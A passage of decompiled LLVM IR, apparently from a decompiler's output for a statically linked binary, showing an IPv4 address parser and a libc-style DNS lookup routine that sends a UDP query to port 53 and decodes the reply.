  %v3_10012870 = icmp eq i8* %arg1, null
  br i1 %v3_10012870, label %dec_label_pc_10012928, label %dec_label_pc_10012878

dec_label_pc_10012878:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1001288c.pre = load i32, i32* @global_var_10028798, align 4
  br label %dec_label_pc_10012888

dec_label_pc_10012888:                            ; preds = %dec_label_pc_10012878, %dec_label_pc_10012900
  %v0_10012900 = phi i32 [ 0, %dec_label_pc_10012878 ], [ %v2_10012908, %dec_label_pc_10012900 ]
  %v0_10012904 = phi i32 [ 1, %dec_label_pc_10012878 ], [ %v1_10012904, %dec_label_pc_10012900 ]
  %v0_10012888 = phi i32 [ %tmp, %dec_label_pc_10012878 ], [ %v0_100128883, %dec_label_pc_10012900 ]
  %v1_10012888 = inttoptr i32 %v0_10012888 to i8*
  %v2_10012888 = load i8, i8* %v1_10012888, align 1
  %v3_10012888 = zext i8 %v2_10012888 to i32
  %v1_10012890 = mul nuw nsw i32 %v3_10012888, 2
  %v2_10012894 = add i32 %v1_10012890, %v3_1001288c.pre
  %v3_10012894 = inttoptr i32 %v2_10012894 to i16*
  %v4_10012894 = load i16, i16* %v3_10012894, align 2
  %v1_10012898 = and i16 %v4_10012894, 8
  %v3_10012898 = icmp eq i16 %v1_10012898, 0
  br i1 %v3_10012898, label %dec_label_pc_10012928, label %dec_label_pc_100128a0

dec_label_pc_100128a0:                            ; preds = %dec_label_pc_10012888
  br label %dec_label_pc_100128b8

dec_label_pc_100128a8:                            ; preds = %dec_label_pc_100128b8
  %v1_100128bc = mul i32 %v1_10012908, 10
  %v2_100128c4 = add i32 %v3_100128b8, %v1_100128bc
  %v1_100128a8 = add i32 %v2_100128c4, -48
  %v1_100128ac = add i32 %v0_100128f0, 1
  %v2_100128b0 = icmp sgt i32 %v1_100128a8, 255
  br i1 %v2_100128b0, label %dec_label_pc_10012928, label %dec_label_pc_100128b8

dec_label_pc_100128b8:                            ; preds = %dec_label_pc_100128a8, %dec_label_pc_100128a0
  %v1_10012908 = phi i32 [ %v1_100128a8, %dec_label_pc_100128a8 ], [ 0, %dec_label_pc_100128a0 ]
  %v0_100128f0 = phi i32 [ %v1_100128ac, %dec_label_pc_100128a8 ], [ %v0_10012888, %dec_label_pc_100128a0 ]
  %v1_100128b8 = inttoptr i32 %v0_100128f0 to i8*
  %v2_100128b8 = load i8, i8* %v1_100128b8, align 1
  %v3_100128b8 = zext i8 %v2_100128b8 to i32
  %v1_100128c0 = mul nuw nsw i32 %v3_100128b8, 2
  %v2_100128c8 = add i32 %v1_100128c0, %v3_1001288c.pre
  %v3_100128c8 = inttoptr i32 %v2_100128c8 to i16*
  %v4_100128c8 = load i16, i16* %v3_100128c8, align 2
  %v5_100128c8 = zext i16 %v4_100128c8 to i32
  %v1_100128cc = and i32 %v5_100128c8, 8
  %v3_100128cc = icmp eq i32 %v1_100128cc, 0
  br i1 %v3_100128cc, label %dec_label_pc_100128d4, label %dec_label_pc_100128a8

dec_label_pc_100128d4:                            ; preds = %dec_label_pc_100128b8
  %v2_100128d4 = icmp sgt i32 %v0_10012904, 3
  br i1 %v2_100128d4, label %dec_label_pc_100128ec, label %dec_label_pc_100128dc

dec_label_pc_100128dc:                            ; preds = %dec_label_pc_100128d4
  %v3_100128dc = icmp eq i8 %v2_100128b8, 46
  br i1 %v3_100128dc, label %dec_label_pc_100128e4, label %dec_label_pc_10012928

dec_label_pc_100128e4:                            ; preds = %dec_label_pc_100128dc
  %v1_100128e4 = add i32 %v0_100128f0, 1
  br label %dec_label_pc_10012900

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_100128d4
  %v3_100128ec = icmp eq i8 %v2_100128b8, 0
  %v1_100128f0 = add i32 %v0_100128f0, 1
  br i1 %v3_100128ec, label %dec_label_pc_10012900, label %dec_label_pc_100128f8

dec_label_pc_100128f8:                            ; preds = %dec_label_pc_100128ec
  %v1_100128f8 = and i32 %v5_100128c8, 32
  %v3_100128f8 = icmp eq i32 %v1_100128f8, 0
  br i1 %v3_100128f8, label %dec_label_pc_10012928, label %dec_label_pc_10012900

dec_label_pc_10012900:                            ; preds = %dec_label_pc_100128f8, %dec_label_pc_100128ec, %dec_label_pc_100128e4
  %v0_100128883 = phi i32 [ %v1_100128f0, %dec_label_pc_100128f8 ], [ %v1_100128f0, %dec_label_pc_100128ec ], [ %v1_100128e4, %dec_label_pc_100128e4 ]
  %v1_10012900 = mul i32 %v0_10012900, 256
  %v1_10012904 = add nuw nsw i32 %v0_10012904, 1
  %v2_10012908 = or i32 %v1_10012908, %v1_10012900
  store i32 %v2_10012908, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10012904, 5
  br i1 %tmp10, label %dec_label_pc_10012888, label %dec_label_pc_10012914

dec_label_pc_10012914:                            ; preds = %dec_label_pc_10012900
  %v0_10012914 = load i32, i32* @r4, align 4
  %v3_10012914 = icmp eq i32 %v0_10012914, 0
  %v0_1001291c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012914, i32 %v0_1001291c)
  %v0_10012920 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012920 = load i32, i32* @r4, align 4
  %v2_10012920 = inttoptr i32 %v1_10012920 to i32*
  store i32 %v0_10012920, i32* %v2_10012920, align 4
  ret i32 1

dec_label_pc_10012928:                            ; preds = %dec_label_pc_100128dc, %dec_label_pc_100128f8, %dec_label_pc_10012888, %dec_label_pc_100128a8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10012908, { 1, 0 }
  uselistorder i32 %v1_10012904, { 1, 0 }
  uselistorder i32 %v0_100128f0, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10012928, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10012888, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10012934 = load i32, i32* @lr, align 4
  store i32 %v0_10012934, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268511584, i32* @lr, align 4
  %v0_1001295c = call i32 @malloc()
  store i32 %v0_1001295c, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268511596, i32* @lr, align 4
  %v0_10012968 = call i32 @malloc()
  %v0_1001296c = load i32, i32* @r30, align 4
  %v3_1001296c = icmp eq i32 %v0_1001296c, 0
  store i32 %v0_10012968, i32* @r21, align 4
  br i1 %v3_1001296c, label %dec_label_pc_10012f28, label %dec_label_pc_10012978

dec_label_pc_10012978:                            ; preds = %entry
  %v3_10012978 = icmp eq i32 %v0_10012968, 0
  br i1 %v3_10012978, label %dec_label_pc_10012f28, label %dec_label_pc_10012980

dec_label_pc_10012980:                            ; preds = %dec_label_pc_10012978
  %v0_10012980 = load i32, i32* @r23, align 4
  %v3_10012980 = icmp eq i32 %v0_10012980, 0
  br i1 %v3_10012980, label %dec_label_pc_10012f28, label %dec_label_pc_10012988

dec_label_pc_10012988:                            ; preds = %dec_label_pc_10012980
  %v0_10012988 = load i32, i32* %r14.global-to-local, align 4
  %v1_10012988 = inttoptr i32 %v0_10012988 to i8*
  %v2_10012988 = load i8, i8* %v1_10012988, align 1
  %v3_10012988 = zext i8 %v2_10012988 to i32
  store i32 %v3_10012988, i32* %r0.global-to-local, align 4
  %v3_1001298c = icmp eq i8 %v2_10012988, 0
  br i1 %v3_1001298c, label %dec_label_pc_10012f28, label %dec_label_pc_10012994

dec_label_pc_10012994:                            ; preds = %dec_label_pc_10012988
  store i32 %v0_10012988, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  %v0_1001299c = call i32 @__GI_strlen()
  %v0_100129a4 = load i32, i32* %r14.global-to-local, align 4
  %v2_100129a4 = add i32 %v0_100129a4, %v0_1001299c
  %v1_100129ac = add i32 %v2_100129a4, -1
  %v2_100129ac = inttoptr i32 %v1_100129ac to i8*
  %v3_100129ac = load i8, i8* %v2_100129ac, align 1
  %v4_100129ac = zext i8 %v3_100129ac to i32
  store i32 %v4_100129ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002ea78.700 to i32), i32* %r29.global-to-local, align 4
  %v2_100129b4 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_100129b4, i32* %r28.global-to-local, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v1_100129c0 = xor i32 %v4_100129ac, 46
  store i32 %v1_100129c0, i32* %r17.global-to-local, align 4
  %v0_100129c4 = call i32 @__pthread_return_void()
  %v0_100129cc = call i32 @__pthread_return_0()
  %v3_100129d4 = load i32, i32* @global_var_10028838.701, align 4
  store i32 %v3_100129d4, i32* %r11.global-to-local, align 4
  %v3_100129e0 = load i16, i16* @global_var_10028754.702, align 2
  %v4_100129e0 = zext i16 %v3_100129e0 to i32
  store i32 %v4_100129e0, i32* @r25, align 4
  %v1_100129e4 = load i32, i32* @r23, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100129e4 = srem i32 %v3_100129d4, %v1_100129e4
  %v2_10012a00 = sub i32 %v3_100129d4, %v2_100129e4
  store i32 %v2_10012a00, i32* %r0.global-to-local, align 4
  store i32 %v2_100129e4, i32* @r26, align 4
  %v0_10012a08 = call i32 @__pthread_return_void()
  %v0_10012f1c.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10012f1c.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10012a10.lr.ph.lr.ph, label %dec_label_pc_10012f34

dec_label_pc_10012a10.lr.ph.lr.ph:                ; preds = %dec_label_pc_10012994
  %v2_10012a28 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10012b3c = ptrtoint i32* %stack_var_-204 to i32
  %v2_10012b9c = ptrtoint i16* %stack_var_-212 to i32
  %v2_10012be0 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10012c3c = icmp eq i32 %tmp37, 0
  %v3_10012c48 = icmp eq i32 %tmp36, 3
  %v2_10012cc4 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10012d18 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10012d44 = icmp eq i32 %tmp33, 0
  %v3_10012cb8 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10012a10.lr.ph

dec_label_pc_10012a10:                            ; preds = %dec_label_pc_10012a10.lr.ph, %dec_label_pc_10012bc0
  %v0_10012a10 = load i32, i32* @r19, align 4
  %v3_10012a10 = icmp eq i32 %v0_10012a10, -1
  br i1 %v3_10012a10, label %dec_label_pc_10012a20, label %dec_label_pc_10012a18

dec_label_pc_10012a18:                            ; preds = %dec_label_pc_10012a10
  store i32 268511776, i32* @lr, align 4
  %v1_10012a1c = call i32 @__libc_close(i32 %v0_10012a10)
  br label %dec_label_pc_10012a20

dec_label_pc_10012a20:                            ; preds = %dec_label_pc_10012a10, %dec_label_pc_10012a18
  store i32 %v2_10012a28, i32* %r29.global-to-local, align 4
  %v0_10012a2c = load i32, i32* @r30, align 4
  store i32 268511796, i32* @lr, align 4
  %v3_10012a30 = call i32 @__GI_memset(i32 %v0_10012a2c, i32 0, i32 512)
  store i32 268511812, i32* @lr, align 4
  %v3_10012a40 = call i32 @__GI_memset(i32 %v2_10012a28, i32 0, i32 48)
  %v0_10012a44 = load i32, i32* @r25, align 4
  %v1_10012a44 = add i32 %v0_10012a44, 1
  %v1_10012a48 = urem i32 %v1_10012a44, 65536
  store i32 %v1_10012a48, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012a54 = load i32, i32* @r30, align 4
  store i32 %v1_10012a48, i32* %stack_var_-144, align 4
  %v4_10012a68 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10012a54, i32 512)
  store i32 %v4_10012a68, i32* %r28.global-to-local, align 4
  %v1_10012a6c = icmp slt i32 %v4_10012a68, 0
  br i1 %v1_10012a6c, label %dec_label_pc_10012f34, label %dec_label_pc_10012a74

dec_label_pc_10012a74:                            ; preds = %dec_label_pc_10012a20
  %v0_10012a74 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10012a74, i32* @r4, align 4
  %v0_10012a7c = load i32, i32* @r21, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268511880, i32* @lr, align 4
  %v4_10012a84 = call i32 @strncpy(i32 %v0_10012a7c, i32 %v0_10012a74, i32 1025)
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v0_10012a9c = call i32 @__pthread_return_void()
  %v0_10012aa4 = call i32 @__pthread_return_0()
  %v0_10012aa8 = load i32, i32* @r22, align 4
  %v1_10012aa8 = icmp slt i32 %v0_10012aa8, 0
  %v0_10012ab0 = load i32, i32* @r26, align 4
  %v1_10012ab0 = mul i32 %v0_10012ab0, 4
  store i32 %v1_10012ab0, i32* %r0.global-to-local, align 4
  %v2_10012ab4 = add i32 %v1_10012ab0, %arg4
  %v3_10012ab4 = inttoptr i32 %v2_10012ab4 to i32*
  %v4_10012ab4 = load i32, i32* %v3_10012ab4, align 4
  store i32 %v4_10012ab4, i32* %r29.global-to-local, align 4
  br i1 %v1_10012aa8, label %dec_label_pc_10012afc, label %dec_label_pc_10012abc

dec_label_pc_10012abc:                            ; preds = %dec_label_pc_10012a74
  %v3_10012ac0 = load i32, i32* @global_var_10028840.704, align 4
  store i32 %v3_10012ac0, i32* %r0.global-to-local, align 4
  %v2_10012ac4 = icmp slt i32 %v0_10012aa8, %v3_10012ac0
  br i1 %v2_10012ac4, label %dec_label_pc_10012acc, label %dec_label_pc_10012afc

dec_label_pc_10012acc:                            ; preds = %dec_label_pc_10012abc
  store i32 ptrtoint (i32* @global_var_10018188.705 to i32), i32* @r4, align 4
  %v0_10012ad8 = load i32, i32* @r21, align 4
  store i32 268511968, i32* @lr, align 4
  %v4_10012adc = inttoptr i32 %v0_10012ad8 to i8*
  %v5_10012adc = call i32 @__GI_strncat(i8* %v4_10012adc, i32 ptrtoint (i32* @global_var_10018188.705 to i32), i32 1025, i32 268632064)
  %v0_10012ae4 = load i32, i32* @r22, align 4
  %v1_10012ae4 = mul i32 %v0_10012ae4, 4
  store i32 %v1_10012ae4, i32* %r0.global-to-local, align 4
  %v2_10012aec = add i32 %v1_10012ae4, ptrtoint (i32* @global_var_1002eb28.706 to i32)
  %v3_10012aec = inttoptr i32 %v2_10012aec to i32*
  %v4_10012aec = load i32, i32* %v3_10012aec, align 4
  store i32 %v4_10012aec, i32* @r4, align 4
  %v0_10012af0 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012afc.707 to i32), i32* @lr, align 4
  %v4_10012af8 = inttoptr i32 %v0_10012af0 to i8*
  %v5_10012af8 = call i32 @__GI_strncat(i8* %v4_10012af8, i32 %v4_10012aec, i32 1025, i32 ptrtoint (i32* @global_var_1002eb28.706 to i32))
  br label %dec_label_pc_10012afc

dec_label_pc_10012afc:                            ; preds = %dec_label_pc_10012abc, %dec_label_pc_10012a74, %dec_label_pc_10012acc
  store i32 %v2_100129b4, i32* @r3, align 4
  %v0_10012b04 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012b10 = load i32, i32* @r30, align 4
  %v1_10012b10 = load i32, i32* %r28.global-to-local, align 4
  %v2_10012b10 = add i32 %v1_10012b10, %v0_10012b10
  %v1_10012b14 = sub i32 512, %v1_10012b10
  %v0_10012b1c = load i32, i32* @r21, align 4
  store i32 %v0_10012b1c, i32* %stack_var_-240, align 4
  store i32 268512040, i32* @lr, align 4
  %v4_10012b24 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10012b10, i32 %v1_10012b14)
  store i32 %v4_10012b24, i32* @r27, align 4
  %v1_10012b28 = icmp slt i32 %v4_10012b24, 0
  br i1 %v1_10012b28, label %dec_label_pc_10012f34, label %dec_label_pc_10012b30

dec_label_pc_10012b30:                            ; preds = %dec_label_pc_10012afc
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10012b38 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268512072, i32* @lr, align 4
  %v3_10012b44 = inttoptr i32 %v0_10012b38 to i8*
  %v4_10012b44 = call i32 @inet_pton(i32 10, i8* %v3_10012b44, i32 %v2_10012b3c)
  %tmp59 = icmp slt i32 %v4_10012b44, 1
  br i1 %tmp59, label %dec_label_pc_10012b58thread-pre-split, label %dec_label_pc_10012b50

dec_label_pc_10012b50:                            ; preds = %dec_label_pc_10012b30
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10012b58

dec_label_pc_10012b58thread-pre-split:            ; preds = %dec_label_pc_10012b30
  %v3_10012b58.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10012b58

dec_label_pc_10012b58:                            ; preds = %dec_label_pc_10012b58thread-pre-split, %dec_label_pc_10012b50
  %v3_10012b58 = phi i16 [ %v3_10012b58.pr, %dec_label_pc_10012b58thread-pre-split ], [ 10, %dec_label_pc_10012b50 ]
  %v3_10012b5c = icmp eq i16 %v3_10012b58, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10012b5c, label %dec_label_pc_10012b84, label %dec_label_pc_10012b70

dec_label_pc_10012b70:                            ; preds = %dec_label_pc_10012b58
  %v0_10012b74 = load i32, i32* @r29, align 4
  store i32 268512128, i32* @lr, align 4
  %v1_10012b7c = call i32 @inet_addr(i32 %v0_10012b74)
  %v3_10012b84.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10012b84

dec_label_pc_10012b84:                            ; preds = %dec_label_pc_10012b58, %dec_label_pc_10012b70
  %v3_10012b84 = phi i16 [ 10, %dec_label_pc_10012b58 ], [ %v3_10012b84.pre, %dec_label_pc_10012b70 ]
  %v4_10012b84 = sext i16 %v3_10012b84 to i32
  store i32 268512148, i32* @lr, align 4
  %v3_10012b90 = call i32 @socket(i32 %v4_10012b84, i32 2, i32 17)
  store i32 %v3_10012b90, i32* @r19, align 4
  %v1_10012b94 = icmp slt i32 %v3_10012b90, 0
  br i1 %v1_10012b94, label %dec_label_pc_10012bc0, label %dec_label_pc_10012b9c

dec_label_pc_10012b9c:                            ; preds = %dec_label_pc_10012b84
  store i32 268512168, i32* @lr, align 4
  %v3_10012ba4 = call i32 @__libc_connect(i32 %v2_10012b9c, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10012ba4, -1
  br i1 %tmp60, label %dec_label_pc_10012bc8, label %dec_label_pc_10012bb0

dec_label_pc_10012bb0:                            ; preds = %dec_label_pc_10012b9c
  %v0_10012bb0 = call i32 @__errno_location()
  %v1_10012bb4 = inttoptr i32 %v0_10012bb0 to i32*
  %v2_10012bb4 = load i32, i32* %v1_10012bb4, align 4
  store i32 %v2_10012bb4, i32* %r0.global-to-local, align 4
  %v3_10012bb8 = icmp eq i32 %v2_10012bb4, 101
  br i1 %v3_10012bb8, label %dec_label_pc_10012f00, label %dec_label_pc_10012bc0

dec_label_pc_10012bc0:                            ; preds = %dec_label_pc_10012bb0, %dec_label_pc_10012b84
  %v0_10012bc0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10012bc0 = add i32 %v0_10012bc0, 1
  store i32 %v1_10012bc0, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10012bc0, 3
  br i1 %tmp61, label %dec_label_pc_10012a10, label %dec_label_pc_10012f34

dec_label_pc_10012bc8:                            ; preds = %dec_label_pc_10012b9c
  %v0_10012bc8 = load i32, i32* @r28, align 4
  %v1_10012bc8 = load i32, i32* @r27, align 4
  %v2_10012bc8 = add i32 %v1_10012bc8, %v0_10012bc8
  %v0_10012bcc = load i32, i32* @r30, align 4
  %v0_10012bd4 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10012bdc.709 to i32), i32* @lr, align 4
  %v4_10012bd8 = call i32 @__libc_send(i32 %v0_10012bd4, i32 %v0_10012bcc, i32 %v2_10012bc8, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012bf0 = load i32, i32* @r19, align 4
  store i32 %v0_10012bf0, i32* %stack_var_-248, align 4
  store i32 268512248, i32* @lr, align 4
  %v3_10012bf4 = call i32 @__libc_poll(i32 %v2_10012be0, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10012bf4, 1
  br i1 %tmp62, label %dec_label_pc_10012f00, label %dec_label_pc_10012c00

dec_label_pc_10012c00:                            ; preds = %dec_label_pc_10012bc8
  %v0_10012c00 = load i32, i32* @r19, align 4
  %v0_10012c04 = load i32, i32* @r30, align 4
  store i32 268512276, i32* @lr, align 4
  %v4_10012c10 = call i32 @__libc_recv(i32 %v0_10012c00, i32 %v0_10012c04, i32 512, i32 0)
  store i32 %v4_10012c10, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10012c10, 12
  br i1 %tmp63, label %dec_label_pc_10012ea8, label %dec_label_pc_10012c20

dec_label_pc_10012c20:                            ; preds = %dec_label_pc_10012c00
  %v0_10012c20 = load i32, i32* @r30, align 4
  %v2_10012c28 = inttoptr i32 %v0_10012c20 to i8*
  %v3_10012c28 = call i32 @__decode_header(i8* %v2_10012c28, i32 %v2_10012a28)
  %v3_10012c2c = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10012c2c, i32* @r20, align 4
  %v1_10012c30 = load i32, i32* @r25, align 4
  %v4_10012c30 = icmp eq i32 %v3_10012c2c, %v1_10012c30
  br i1 %v4_10012c30, label %dec_label_pc_10012c38, label %dec_label_pc_10012ea8

dec_label_pc_10012c38:                            ; preds = %dec_label_pc_10012c20
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10012c3c, label %dec_label_pc_10012ea8, label %dec_label_pc_10012c44

dec_label_pc_10012c44:                            ; preds = %dec_label_pc_10012c38
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10012c48, label %dec_label_pc_10012c50, label %dec_label_pc_10012cb8

dec_label_pc_10012c50:                            ; preds = %dec_label_pc_10012c44
  %v0_10012c50 = load i32, i32* %r17.global-to-local, align 4
  %v3_10012c50 = icmp eq i32 %v0_10012c50, 0
  br i1 %v3_10012c50, label %dec_label_pc_10012c58, label %dec_label_pc_10012cac

dec_label_pc_10012c58:                            ; preds = %dec_label_pc_10012c50
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_100129b4, i32* %r28.global-to-local, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v0_10012c74 = call i32 @__pthread_return_void()
  %v0_10012c7c = call i32 @__pthread_return_0()
  %v3_10012c84 = load i32, i32* @global_var_10028840.704, align 4
  store i32 %v2_100129b4, i32* @r3, align 4
  %v1_10012c90 = add i32 %v3_10012c84, -1
  store i32 %v1_10012c90, i32* %r29.global-to-local, align 4
  %v0_10012c94 = call i32 @__pthread_return_void()
  %v0_10012c98 = load i32, i32* @r22, align 4
  %v2_10012c98 = icmp slt i32 %v0_10012c98, %v1_10012c90
  br i1 %v2_10012c98, label %dec_label_pc_10012ca0, label %dec_label_pc_10012cac

dec_label_pc_10012ca0:                            ; preds = %dec_label_pc_10012c58
  %v1_10012ca0 = add i32 %v0_10012c98, 1
  store i32 %v1_10012ca0, i32* @r22, align 4
  %v0_10012ca4 = load i32, i32* @r20, align 4
  store i32 %v0_10012ca4, i32* @r25, align 4
  br label %dec_label_pc_10012f1cthread-pre-split.backedge

dec_label_pc_10012cac:                            ; preds = %dec_label_pc_10012c58, %dec_label_pc_10012c50
  %v0_10012cac = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012ce0

dec_label_pc_10012cb8:                            ; preds = %dec_label_pc_10012c44
  br i1 %v3_10012cb8, label %dec_label_pc_10012cc0, label %dec_label_pc_10012ea8

dec_label_pc_10012cc0:                            ; preds = %dec_label_pc_10012cb8
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10012cd8, label %dec_label_pc_10012ccc

dec_label_pc_10012ccc:                            ; preds = %dec_label_pc_10012cc0
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10012cf810 = load i32, i32* @r30, align 4
  store i32 %v0_10012cf810, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012ce8

dec_label_pc_10012cd8:                            ; preds = %dec_label_pc_10012cc0
  %v0_10012cd8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012ce0

dec_label_pc_10012ce0:                            ; preds = %dec_label_pc_10012cac, %dec_label_pc_10012cd8
  %storemerge3 = phi i32 [ %v0_10012cd8, %dec_label_pc_10012cd8 ], [ %v0_10012cac, %dec_label_pc_10012cac ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10012cd8 ], [ 1, %dec_label_pc_10012cac ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10012ce0 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10012ce0, align 4
  br label %dec_label_pc_10012f44

dec_label_pc_10012ce8:                            ; preds = %dec_label_pc_10012ccc, %dec_label_pc_10012ce8
  %v0_10012cf814 = phi i32 [ %v0_10012cf810, %dec_label_pc_10012ccc ], [ %v0_10012cf8, %dec_label_pc_10012ce8 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10012ccc ], [ %v2_10012cec, %dec_label_pc_10012ce8 ]
  store i32 268512492, i32* @lr, align 4
  %v2_10012ce8 = call i32 @__length_question(i32 %v0_10012cf814, i32 %storemerge213)
  %v0_10012cec = load i32, i32* %r28.global-to-local, align 4
  %v2_10012cec = add i32 %v0_10012cec, %v2_10012ce8
  %v0_10012cfc.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10012cec, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10012cec, i32* @r4, align 4
  %v0_10012cf8 = load i32, i32* @r30, align 4
  store i32 %v0_10012cf8, i32* @r3, align 4
  %v2_10012cfc = icmp slt i32 %v0_10012cfc.pr, 1
  %v1_10012d00 = add i32 %v0_10012cfc.pr, 1
  store i32 %v1_10012d00, i32* %r29.global-to-local, align 4
  br i1 %v2_10012cfc, label %dec_label_pc_10012ce8, label %dec_label_pc_10012d08

dec_label_pc_10012d08:                            ; preds = %dec_label_pc_10012ce8
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10012cc4, label %dec_label_pc_10012e54, label %dec_label_pc_10012e5c

dec_label_pc_10012d18:                            ; preds = %dec_label_pc_10012e54
  store i32 %v2_10012d18, i32* %r29.global-to-local, align 4
  %v0_10012d1c = load i32, i32* @r30, align 4
  store i32 268512560, i32* @lr, align 4
  %v5_10012d2c = call i32 @__decode_answer(i32 %v0_10012d1c, i32 %v0_10012d20, i32 %v1_10012e54, i32* nonnull %stack_var_-184)
  store i32 %v5_10012d2c, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10012d2c, -1
  br i1 %tmp64, label %dec_label_pc_10012d50, label %dec_label_pc_10012d38

dec_label_pc_10012d38:                            ; preds = %dec_label_pc_10012d18
  %v0_10012d38 = load i32, i32* @r24, align 4
  %v3_10012d38 = icmp eq i32 %v0_10012d38, 0
  br i1 %v3_10012d38, label %dec_label_pc_10012ea8, label %dec_label_pc_10012d40

dec_label_pc_10012d40:                            ; preds = %dec_label_pc_10012d38
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10012d44, label %dec_label_pc_10012ea8, label %dec_label_pc_10012e5c

dec_label_pc_10012d50:                            ; preds = %dec_label_pc_10012d18
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10012d54 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10012d54, label %dec_label_pc_10012df8, label %dec_label_pc_10012d5c

